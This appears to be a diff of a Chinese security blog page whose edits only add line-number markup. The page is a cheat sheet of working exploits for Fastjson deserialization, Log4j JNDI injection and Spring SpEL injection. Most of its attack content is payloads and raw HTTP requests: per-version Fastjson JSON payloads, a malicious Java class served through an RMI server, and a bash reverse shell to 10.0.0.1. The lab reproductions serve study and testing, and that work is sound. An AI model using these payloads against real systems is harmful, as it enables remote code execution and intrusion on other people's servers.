@@ -255,47 +255,47 @@
 <hr>
 <p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
 <h2 id="0x01-Fastjson"><a href="#0x01-Fastjson" class="headerlink" title="0x01 Fastjson"></a>0x01 Fastjson</h2><h3 id="1-反序列化漏洞史"><a href="#1-反序列化漏洞史" class="headerlink" title="1. 反序列化漏洞史"></a>1. 反序列化漏洞史</h3><p><strong>fastjson &lt;&#x3D;1.2.24 反序化RCE (CVE-2017-18349)</strong></p>
-<pre class="language-none"><code class="language-none">Pippo 1.11.0版本中的FastjsonEngine所使用的Fastjson 1.2.25之前版本的parseObject存在安全漏洞。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链，远程攻击者可通过发送特制的JSON请求利用该漏洞执行任意代码</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Pippo 1.11.0版本中的FastjsonEngine所使用的Fastjson 1.2.25之前版本的parseObject存在安全漏洞。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链，远程攻击者可通过发送特制的JSON请求利用该漏洞执行任意代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.41 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">在1.2.24之后，fastjson1.2.25开始默认关闭对autoType的支持，并且添加checkAutoType方法，其采用了白名单+黑名单的模式对开启autoType开启的情况进行防御。但是在1.2.25-1.2.41版本之间多了一次绕过</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">在1.2.24之后，fastjson1.2.25开始默认关闭对autoType的支持，并且添加checkAutoType方法，其采用了白名单+黑名单的模式对开启autoType开启的情况进行防御。但是在1.2.25-1.2.41版本之间多了一次绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.42 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">为了修复L;绕过的问题，在checkAutoType函数中会去掉开头L和结尾; 。并且将黑白名单从明文改成了hash校验，但依然是从前往后一个个字符进行校验。这里的绕过方式也非常简单，通过LLcom.sun.rowset.JdbcRowSetImpl;;绕过</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">为了修复L;绕过的问题，在checkAutoType函数中会去掉开头L和结尾; 。并且将黑白名单从明文改成了hash校验，但依然是从前往后一个个字符进行校验。这里的绕过方式也非常简单，通过LLcom.sun.rowset.JdbcRowSetImpl;;绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.43 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">针对1.2.42绕过的情况，在版本1.2.43增加了判断条件，检测到LL则抛出异常。然而TypeUtils.loadClass中对以[开始的类名也做了处理，可以继续构造数组形式的类型，在parseArray函数中触发反序列化。
+<pre class="line-numbers language-none"><code class="language-none">针对1.2.42绕过的情况，在版本1.2.43增加了判断条件，检测到LL则抛出异常。然而TypeUtils.loadClass中对以[开始的类名也做了处理，可以继续构造数组形式的类型，在parseArray函数中触发反序列化。
 
 &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap:&#x2F;&#x2F;localhost&#x2F;test\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;
 
-在1.2.44版本中检测到[开始或者L开始;结尾两种情况都会直接抛出异常，至此无法再使用此方式绕过黑名单校验</code></pre>
+在1.2.44版本中检测到[开始或者L开始;结尾两种情况都会直接抛出异常，至此无法再使用此方式绕过黑名单校验<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.45 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">黑名单绕过1.2.44的修复继续反序化RCE：&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">黑名单绕过1.2.44的修复继续反序化RCE：&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.47 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">com.sun.rowset.JdbcRowSetImpl方法绕过继续反序化RCE</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">com.sun.rowset.JdbcRowSetImpl方法绕过继续反序化RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt; 1.2.51 远程代码执行</strong></p>
-<pre class="language-none"><code class="language-none">fastjson &lt; 1.2.51版本存在代码执行漏洞，当用户提交一个精心构造的恶意的序列化数据到服务器端时，fastjson在反序列化时存在漏洞，可导致远程任意代码执行</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">fastjson &lt; 1.2.51版本存在代码执行漏洞，当用户提交一个精心构造的恶意的序列化数据到服务器端时，fastjson在反序列化时存在漏洞，可导致远程任意代码执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt; 1.2.61 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.62 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">org.apache.xbean.propertyeditor.JndiConverter方法绕过继续反序化RCE</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">org.apache.xbean.propertyeditor.JndiConverter方法绕过继续反序化RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt; 1.2.66 反序化RCE</strong></p>
-<pre class="language-none"><code class="language-none">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">fastjson采用黑名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可轻松绕过黑名单防御机制，反序列化漏洞就会再次出现。fastjson自1.2.25以上默认关闭autotype，默认配置不受漏洞影响<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt; 1.2.67 反序列化&#x2F;SSRF漏洞</strong></p>
-<pre class="language-none"><code class="language-none">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可能可以绕过黑白名单防御机制，造成远程命令执行或者SSRF漏洞</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的可攻击的反序列化Gadgets类时，则可能可以绕过黑白名单防御机制，造成远程命令执行或者SSRF漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt;&#x3D;1.2.68 反序列化RCE</strong></p>
-<pre class="language-none"><code class="language-none">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的反序列化Gadgets类时，在autoType关闭的情况下仍然可能可以绕过黑白名单防御机制，造成远程命令执行漏洞。该漏洞利用门槛较低，可绕过autoType，风险影响较大</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">fastjson采用黑白名单的方法来防御反序列化漏洞，导致当黑客不断发掘新的反序列化Gadgets类时，在autoType关闭的情况下仍然可能可以绕过黑白名单防御机制，造成远程命令执行漏洞。该漏洞利用门槛较低，可绕过autoType，风险影响较大<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson &lt; 1.2.70 反序列化RCE</strong></p>
-<pre class="language-none"><code class="language-none">1.2.70新增多个autoType反序列化利用Gadgets黑名单类:
+<pre class="line-numbers language-none"><code class="language-none">1.2.70新增多个autoType反序列化利用Gadgets黑名单类:
 
 org.apache.commons.collections4.Transformer
 org.apache.commons.collections4.functors
@@ -308,12 +308,12 @@ org.apache.activemq.spring.
 org.apache.activemq.ActiveMQXAConnectionFactory
 org.apache.commons.jelly.
 org.apache.axis2.transport.jms.
-com.p6spy.engine.</code></pre>
+com.p6spy.engine.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="2-漏洞复现及利用"><a href="#2-漏洞复现及利用" class="headerlink" title="2. 漏洞复现及利用"></a>2. 漏洞复现及利用</h3><p>以Fastjson 1.2.4为例，目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令</p>
 <p><strong>a. 构造恶意java类</strong></p>
 <p>编译并上传命令执行，如：<a href="http://rhost:rport/Exploit.class">http://rhost:rport/Exploit.class</a></p>
-<pre class="language-none"><code class="language-none">import java.io.BufferedReader;
+<pre class="line-numbers language-none"><code class="language-none">import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 
@@ -336,21 +336,21 @@ public class Exploit&#123;
 
     public static void main(String[] args) throws Exception &#123;
     &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p>
-<pre class="language-none"><code class="language-none">javac Exploit.java</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">javac Exploit.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在远程主机上启一个http服务，需要能访问到Exploit.class文件，如使用python3启动http服务：</p>
-<pre class="language-none"><code class="language-none">python3 -m http.server --bind 0.0.0.0 2233</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server --bind 0.0.0.0 2233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>b. 开启远程方法调用rmi服务</strong></p>
 <p>使用marshalsec项目，启动一个RMI服务器，监听6699端口，并制定加载远程类Exploit.class：</p>
-<pre class="language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;rhost:2233&#x2F;#Exploit&quot; 6699</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;rhost:2233&#x2F;#Exploit&quot; 6699<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>c. 攻击机发送payload</strong></p>
 <p>向存在漏洞的目标机发送fastjson反序列化漏洞payload，带上RMI的地址：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
 Host: target-ip:8090
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -366,34 +366,34 @@ Content-Length: 160
         &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;rhost:6699&#x2F;Exploit&quot;,
         &quot;autoCommit&quot;:true
     &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此时目标主机收到POST请求，触发反序列化漏洞，最终执行恶意Exploit.class</p>
 <h3 id="3-各版本payload"><a href="#3-各版本payload" class="headerlink" title="3. 各版本payload"></a>3. 各版本payload</h3><p><strong>fastjson&lt;&#x3D;1.2.24</strong></p>
-<pre class="language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.41</strong></p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
 
-&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</code></pre>
+&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.42</strong></p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
 
-&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></pre>
+&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.43</strong></p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
 
-&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></pre>
+&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.45</strong></p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
 
-&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</code></pre>
+&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.47</strong></p>
-<pre class="language-none"><code class="language-none">&#123;
+<pre class="line-numbers language-none"><code class="language-none">&#123;
     &quot;a&quot;: &#123;
         &quot;@type&quot;: &quot;java.lang.Class&quot;, 
         &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
@@ -403,13 +403,13 @@ Content-Length: 160
         &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, 
         &quot;autoCommit&quot;: true
     &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.62</strong></p>
-<pre class="language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>fastjson&lt;&#x3D;1.2.66</strong></p>
-<pre class="language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）
 
 &#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;whoami&quot;&#125;
 
@@ -417,7 +417,7 @@ Content-Length: 160
 
 &#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;whoami&quot;&#125;
 
-&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;whoami&quot;&#125;&#125;</code></pre>
+&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;whoami&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/releases">https://github.com/alibaba/fastjson/releases</a></li>
@@ -438,13 +438,13 @@ Content-Length: 160
 <p>通过使用了这个库的应用来复现这个漏洞，比如Apache Solr，启动一个Apache Solr 8.11.0，依赖了Log4j 2.14.1</p>
 <p>服务启动后，访问 <a target="_blank" rel="noopener" href="http://target-ip:8983/">http://target-ip:8983</a> 即可查看到Apache Solr的后台页面</p>
 <p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>是利用JNDI发送DNS请求的Payload，将其作为管理员接口的action参数值发送如下数据包</p>
-<pre class="language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version&#125;.example.com&#125; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version&#125;.example.com&#125; HTTP&#x2F;1.1
 Host: target-ip:8983
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36
-Connection: close</code></pre>
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以在DNS日志平台收到相关日志，显示出当前Java版本</p>
 <h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><ul>
@@ -467,7 +467,7 @@ Connection: close</code></pre>
 <p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”</p>
 <p>再点击确认“Confirm”</p>
 <p>此时抓包，抓到一个POST数据包，向其中添加一个字段（也就是反弹shell的POC, 需URL编码）：</p>
-<pre class="language-none"><code class="language-none">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>成功执行，获得shell</p>
 <h3 id="2-Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）"><a href="#2-Spring-Messaging-远程命令执行漏洞（CVE-2018-1270）" class="headerlink" title="2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）"></a>2. Spring Messaging 远程命令执行漏洞（CVE-2018-1270）</h3><p><strong>漏洞描述</strong></p>
@@ -475,13 +475,13 @@ Connection: close</code></pre>
 <p><strong>漏洞复现</strong></p>
 <p>通过vulhub搭建，环境启动后，访问<code>http://your-ip:8080</code>可看到一个Web页面</p>
 <p>该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发，所以需要指定的信息有：</p>
-<pre class="language-none"><code class="language-none">1)基础地址，在vulhub中为http:&#x2F;&#x2F;your-ip:8080&#x2F;gs-guide-websocket
+<pre class="line-numbers language-none"><code class="language-none">1)基础地址，在vulhub中为http:&#x2F;&#x2F;your-ip:8080&#x2F;gs-guide-websocket
 
 2) 待执行的SpEL表达式，如T(java.lang.Runtime).getRuntime().exec(&#39;touch &#x2F;tmp&#x2F;success&#39;)
 
 3) 某一个订阅的地址，如vulhub中为：&#x2F;topic&#x2F;greetings
 
-4) 如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，向&#x2F;app&#x2F;hello发送一个包含name的json，即可触发这个事件</code></pre>
+4) 如何触发这个订阅，即如何让后端向这个订阅发送消息。在vulhub中，向&#x2F;app&#x2F;hello发送一个包含name的json，即可触发这个事件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>根据需求修改POC, vulhub环境，只需修改1中的url即可</p>
 <p>执行<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py">exploit.py</a>，进入容器docker-compose exec spring bash，可见&#x2F;tmp&#x2F;success已成功创建</p>
@@ -490,7 +490,7 @@ Connection: close</code></pre>
 <p><strong>漏洞利用</strong></p>
 <p>通过vulhub搭建，环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/users%EF%BC%8C%E5%B0%86%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2">http://your-ip:8080/users，将可以看到一个用户注册页面</a></p>
 <p>在注册的时候抓包，并修改成如下数据包：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1
 Host: localhost:8080
 Connection: keep-alive
 Content-Length: 124
@@ -505,7 +505,7 @@ Referer: http:&#x2F;&#x2F;localhost:8080&#x2F;users?page&#x3D;0&amp;size&#x3D;5
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8
 
-username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;</code></pre>
+username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>执行docker-compose exec spring bash进入容器中，可见成功创建&#x2F;tmp&#x2F;success，说明命令执行成功</p>
 <h3 id="4-Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）"><a href="#4-Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行（CVE-2022-22947）" class="headerlink" title="4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）"></a>4. Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</h3><p><strong>漏洞描述</strong></p>
@@ -513,7 +513,7 @@ username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().ex
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub启动一个使用了Spring Cloud Gateway 3.1.0的Web服务，服务启动后，访问<a href="http://your-ip:8080即可看到演示页面">http://your-ip:8080即可看到演示页面</a></p>
 <p>1）首先，发送如下数据包即可添加一个包含恶意SpEL表达式的路由：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -533,12 +533,12 @@ Content-Length: 329
     &#125;
   &#125;],
   &quot;uri&quot;: &quot;http:&#x2F;&#x2F;example.com&quot;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行</li>
 </ol>
-<pre class="language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -546,10 +546,10 @@ Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36
